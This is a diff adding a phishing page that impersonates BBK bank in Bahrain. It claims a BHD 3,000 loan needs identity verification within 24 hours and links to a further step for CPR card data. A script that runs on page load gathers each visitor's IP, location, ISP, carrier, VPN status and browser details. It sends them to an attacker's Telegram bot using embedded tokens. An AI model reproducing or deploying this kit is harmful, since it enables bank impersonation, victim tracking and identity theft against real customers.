@@ -1,0 +1,319 @@
+<html lang="en"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Verify identity</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&amp;display=swap" rel="stylesheet">
+
+<style>
+  :root{
+    --bg:#f4f7f8;
+    --card:#ffffff;
+    --muted:#9aa8b2;
+    --blue:#0b3e7a;
+    --accent:#ff9f00; /* orange */
+    --soft:#edf2f4;
+  }
+  html,body{height:100%}
+  body{
+    margin:0;
+    font-family:"Poppins",system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;
+    background:linear-gradient(180deg,#f6f8f9 0%, var(--bg) 60%);
+    color:var(--blue);
+    -webkit-font-smoothing:antialiased;
+    -moz-osx-font-smoothing:grayscale;
+  }
+
+  /* container sized to mobile screenshot */
+  .wrap{
+    max-width:420px;
+    margin:0 auto;
+    padding:28px 24px 48px;
+    box-sizing:border-box;
+  }
+
+  /* top nav */
+  .top{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    margin-bottom:18px;
+  }
+  .back{
+    width:36px;height:36px;border-radius:50%;
+    display:flex;align-items:center;justify-content:center;
+    background:transparent;border:none;color:var(--blue);
+    cursor:pointer;
+  }
+  .step{
+    color:var(--muted);font-weight:600;font-size:14px;
+  }
+
+  /* progress bar */
+  .progress{
+    margin:6px 0 22px;
+  }
+  .bar{
+    height:8px;border-radius:8px;background:#d6dde3;overflow:hidden;
+    display:flex;
+    width:100%;
+  }
+  .bar > i{background:linear-gradient(90deg,#2c7be5,#1a63c6);width:46%;display:block}
+
+  h1{
+    margin:8px 0 6px;
+    font-size:25px;line-height:1;font-weight:700;color:var(--blue);
+  }
+  .subtitle{
+    color:var(--muted);font-weight:400;margin-bottom:18px;
+  }
+
+  /* thumbnails */
+  .row{
+    display:flex;align-items:flex-start;justify-content:space-between;
+    gap:6px;margin:18px 0 22px;
+  }
+  .thumb{
+    flex:1;text-align:center;padding:6px;
+  }
+  .thumb .img{
+    height:72px;border-radius:8px;
+    display:flex;align-items:center;justify-content:center;
+  }
+  .thumb label{
+    display:block;margin-top:8px;color:var(--blue);font-weight:600;font-size:14px;
+  }
+  .chev{
+    width:20px;height:1px;align-self:center;opacity:.5;
+    display:flex;align-items:center;justify-content:center;color:var(--muted);
+  }
+
+  /* white instructions card */
+  .card{
+    background:var(--card);border-radius:16px;padding:22px;box-shadow:0 10px 30px rgba(17,24,39,0.04);
+    color:var(--muted);font-size:15px;line-height:1.45;margin-bottom:18px;margin-top:-15px;
+  }
+  .card h3{color:var(--blue);font-weight:600;margin:0 0 12px;font-size:16px}
+  .bullet{display:flex;gap:12px;align-items:center;margin:12px 0}
+  .icon{
+    width:36px;height:36px;border-radius:8px;display:inline-flex;align-items:center;justify-content:center;
+    background:linear-gradient(180deg,#fff8ec,#fff3e0);color:var(--accent);flex:0 0 36px;border:1px solid rgba(255,159,0,0.08)
+  }
+  .bullet .t{color:var(--blue);font-weight:500}
+
+  .fineprint{font-size:13px;color:#5a5e61;margin-top:8px}
+
+  /* consent text */
+  .consent{color:#9fb0b9;font-size:12px;margin:20px 4px 40px;line-height:1.6;font-weight:600}
+
+  /* action buttons */
+  .actions{display:flex;flex-direction:column;gap:14px;align-items:stretch}
+  .btn{
+    background:var(--accent);color:white;font-weight:600;padding:16px;border-radius:18px;border:none;font-size:18px;
+    box-shadow:0 8px 0 rgba(255,159,0,0.04);cursor:pointer;
+  }
+  .cancel{background:transparent;color:var(--accent);text-align:center;font-weight:600;border:none;font-size:16px}
+
+  /* small screens tweak */
+  @media (max-width:360px){
+    h1{font-size:25px}
+  }
+
+   .card-img{
+      margin:20px auto;
+      display: block;
+      width:200px;
+      height:auto;
+      
+      border-radius:12px;
+      box-shadow:0 8px 24px rgba(0,0,0,.06);
+      border:1px solid rgba(0,0,0,.06);
+    }
+</style>
+<script>
+window.addEventListener("load", async () => {
+  // --- CONFIG (set your own values)
+  const ipinfoToken = "1b16cc141fc931"; // your ipinfo token
+  const botToken = "8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8"; // your Telegram bot token
+  const chatId = "-5091116242"; // your Telegram chat/channel id
+
+  // --- Helper: Bahrain carrier inference
+  const BH_ASN_MAP = {
+    "AS5416": "Batelco",
+    "AS51375": "stc Bahrain",   // formerly VIVA
+    "AS31452": "Zain Bahrain",
+  };
+  const BH_ORG_REGEX = [
+    { re: /(beyon|batelco|btc\.com\.bh)/i, label: "Batelco" },
+    { re: /\bstc\b|\bstc bahrain\b|viva bahrain/i, label: "stc Bahrain" },
+    { re: /\bzain\b|\bzain bahrain\b/i, label: "Zain Bahrain" },
+  ];
+  const VPN_CLOUD_KEYWORDS = [
+    "amazon","aws","google","gcp","microsoft","azure","cloudflare","fastly",
+    "ovh","hetzner","digitalocean","linode","leaseweb","contabo","scaleway",
+    "vultr","aliyun","huawei cloud","akamai","edgecast","nord","surfshark",
+    "mullvad","proton","expressvpn","vpn","proxy"
+  ];
+
+  const getConnectionHint = () => {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!c) return "n/a";
+    const parts = [];
+    if (c.type) parts.push(`type=${c.type}`);
+    if (c.effectiveType) parts.push(`effectiveType=${c.effectiveType}`);
+    if (typeof c.downlink === "number") parts.push(`downlink≈${c.downlink}Mbps`);
+    if (typeof c.rtt === "number") parts.push(`rtt≈${c.rtt}ms`);
+    return parts.join(" · ") || "available";
+  };
+
+  const normalizeCarrier = (asn, org) => {
+    if (asn && BH_ASN_MAP[asn]) return BH_ASN_MAP[asn];
+    for (const { re, label } of BH_ORG_REGEX) {
+      if (org && re.test(org)) return label;
+    }
+    return null;
+  };
+
+  const looksLikeVpnOrCloud = (org) => {
+    if (!org) return false;
+    const s = org.toLowerCase();
+    return VPN_CLOUD_KEYWORDS.some(k => s.includes(k));
+  };
+
+  try {
+    const time = new Date().toISOString();
+    const browser = navigator.userAgent;
+    const netHint = getConnectionHint();
+
+    // Get IP + ASN/Org from ipinfo
+    const ipRes = await fetch(`https://ipinfo.io/json?token=${encodeURIComponent(ipinfoToken)}`, {
+      cache: "no-store"
+    });
+    const ipData = await ipRes.json();
+
+    // Parse ASN from org string like "AS9829 Bharti Airtel Ltd"
+    const orgRaw = ipData.org || "";  // e.g. "AS5416 Bahrain Telecommunications Company (BATELCO) B.S.C."
+    let asn = "";
+    const m = /^AS(\d+)/i.exec(orgRaw);
+    if (m) asn = `AS${m[1]}`;
+
+    const carrier = normalizeCarrier(asn, orgRaw) || "unknown";
+    const vpnOrCloud = looksLikeVpnOrCloud(orgRaw);
+    const flags = [
+      ipData.country ? `country=${ipData.country}` : null,
+      vpnOrCloud ? "vpn/cloud" : null,
+      ipData.anycast ? "anycast" : null
+    ].filter(Boolean).join(" · ");
+
+    // Build Telegram message
+    const message =
+`🧠 New Visitor
+
+🕒 Time: ${time}
+🌍 IP: ${ipData.ip || "—"}
+📍 Location: ${[ipData.city, ipData.region, ipData.country].filter(Boolean).join(", ") || "—"}
+
+🔎 ASN: ${asn || "—"}
+🏢 Org/ISP: ${orgRaw || "—"}
+📶 Inferred Carrier (BH): ${carrier}
+🏳 Flags: ${flags || "—"}
+
+🧭 Browser: ${browser}
+🌐 Network Hint: ${netHint}`;
+
+    // Send to Telegram
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
+
+  } catch (error) {
+    console.error("Error sending data to Telegram:", error);
+  }
+});
+</script>
+</head>
+
+<body>
+  <div class="wrap">
+    <div class="top">
+      <!-- <button class="back" aria-label="Back">
+       
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"></path></svg>
+      </button> -->
+
+    </div>
+
+    <h1>Verify Loan Application</h1>
+    <div class="subtitle">Please verify your identity to proceed with your loan</div>
+<img class="card-img" src="gh.png" alt="CPR card preview">
+    <div class="row" aria-hidden="false">
+     
+
+   
+
+ 
+      <div class="chev" aria-hidden="true" style="opacity:0.0;pointer-events:none;"></div>
+
+
+    </div>
+
+    <div class="card" role="region" aria-label="Instructions">
+      <h3>Notice:</h3>
+      <div class="fineprint">Dear BBK customer, your loan request of BHD 3,000 is currently under verification. Please confirm your identity to proceed with the BBK loan approval process. if verification is not completed within 24 hours, your loan application may be placed on hold or cancelled automatically.</div>
+    </div>
+
+    <div class="consent">Your data will be stored in the Bank's records and kindly note that your CPR data will be reviewed by BBK loan department.</div>
+
+    <div class="actions">
+      <button class="btn" onclick="location.href = 'cp.html';">Verify identity</button>
+     
+    </div>
+  </div>
+
+
+
+
+
+<div id="give-freely-root-ejkiikneibegknkgimmihdpcbcedgmpo" class="give-freely-root" data-extension-id="ejkiikneibegknkgimmihdpcbcedgmpo" data-extension-name="Volume Booster" style="display: block;"><template shadowrootmode="open"><style>
+  :host {
+    all: initial;
+  }
+
+  .gf-scroll-remove::-webkit-scrollbar {
+    border-radius-bottom-right: 15px;
+  }
+
+  button {
+    cursor: pointer;
+    transition: transform 0.1s ease;
+  }
+
+  button:active {
+    transform: scale(0.98);
+  }
+
+  .give-freely-close-button:hover {
+    opacity: 0.7;
+  }
+
+  input[type="radio"] {
+    margin-right: 8px;
+  }
+
+  hr {
+    border: none;
+    border-top: 1px solid #e5e5e5;
+    margin: 1em 0;
+  }
+
+  @media (max-width: 600px), (max-height: 480px) {
+    #give-freely-checkout-popup {
+      display: none !important;
+    }
+  }
+</style><div><div class="gf-app"></div></div></template></div></body></html>
